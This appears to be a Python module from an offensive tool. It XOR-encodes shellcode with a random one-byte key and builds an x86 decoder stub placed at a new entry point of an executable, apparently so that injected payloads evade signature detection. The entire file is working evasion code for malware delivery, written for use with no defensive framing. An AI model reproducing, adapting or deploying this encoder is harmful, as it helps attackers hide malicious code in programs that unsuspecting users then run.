from itertools import cycle
from coloroma_colors import *
import os 


def xor(data, key):
	"""
	Performs a simple XOR operation.
	"""
	return bytes([a ^ b for a, b in zip(data, cycle(key))])


def xor_encode_shellcode(new_ep, shellcode):
	"""
	Performs a XOR encoding on the shellcode.
	Example : 
	0:  b8 c7 05 0c 00          mov    eax, 0xc05c7
	5:  80 30 d2                xor    BYTE PTR [eax],0xd2
	8:  40                      inc    eax
	9:  3d db 06 0c 00          cmp    eax, 0xc06db
	e:  7e f5                   jle    0x5	
	"""
	print("\n[*]" + " Shellcode XOR Encoding:")
	encoder_count = 1

	xor_key = os.urandom(1)  # e.g: b"\x2f"
	xor_instructs = b"\x80\x30" + xor_key  # XOR <xor_key>
	encoded_shellcode = xor(shellcode, xor_key)  
	print ("\tXOR Key:\t\t\\x" + xor_key.hex().upper())
	# start_decode_addr = new_ep + 0x14

	start_decode_addr = int(hex(new_ep), 16) + int(hex(0x14), 16)




	end_decode_addr = new_ep + int(hex(4 + len(shellcode)), 16)
	end_decode_addr_little = (end_decode_addr + 15).to_bytes(4, 'little')



	print("\tStart address:\t\t" + (hex(int(hex(new_ep), 16) + int(hex(0x1b), 16) + ((encoder_count - 1) * 3))))
	print("\tEnd Address:\t\t" + hex(end_decode_addr))

	xor_decoder = b"\xB8" + start_decode_addr.to_bytes(4, 'little')
	xor_decoder += xor_instructs
	xor_decoder += b"\x40"
	xor_decoder += b"\x3d" + end_decode_addr_little

	# JMP Short\xf5 default 1 key
	short_jmp = 0xf5
	short_jmp = short_jmp - ((encoder_count - 1) * 3)
	xor_decoder += b"\x7e" + short_jmp.to_bytes(1, 'little')
	new_shellcode = xor_decoder + encoded_shellcode

	return new_shellcode